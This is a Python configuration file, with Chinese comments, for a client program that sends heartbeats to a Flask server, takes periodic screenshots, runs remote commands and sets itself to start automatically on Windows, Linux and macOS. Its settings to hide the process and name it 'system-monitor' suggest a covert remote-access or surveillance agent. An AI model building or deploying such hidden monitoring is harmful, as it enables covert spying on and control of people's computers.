# 客户端配置文件
import os

# 服务器配置
# !!! 重要：修改为你的 Flask 服务器的实际 IP 地址和端口 !!!
# 如果服务器和客户端在同一台机器上测试，可以使用 'http://127.0.0.1:5000'
# 如果在局域网内，使用服务器的局域网 IP，例如 'http://192.168.1.100:5000'
# 如果服务器有公网 IP 或域名，使用公网地址
SERVER_URL = "http://localhost:5000/"

# 连接配置
HEARTBEAT_INTERVAL = 30  # 心跳间隔（秒）
RECONNECT_DELAY = 5      # 重新连接尝试间隔（秒）

# 屏幕监控配置
SCREENSHOT_INTERVAL = 3  # 屏幕监控时间间隔（秒）
SCREENSHOT_QUALITY = 80  # 截图质量 (0-100)
SCREENSHOT_SCALE = 1.0   # 截图缩放比例

# 进程配置
HIDE_PROCESS = True      # 是否隐藏进程
PROCESS_NAME = "system-monitor"  # 进程名称


# 应用标识
APP_NAME = "ClayClient"  # Windows注册表使用
LINUX_APP_NAME = "system-monitor"  # Linux自启动使用
MACOS_APP_NAME = "SystemMonitor"  # macOS自启动使用

# 命令执行配置
COMMAND_TIMEOUT = 30  # 命令执行超时时间（秒）

# 临时文件目录
TEMP_DIR = os.environ.get('TEMP', '/tmp')  # 临时文件目录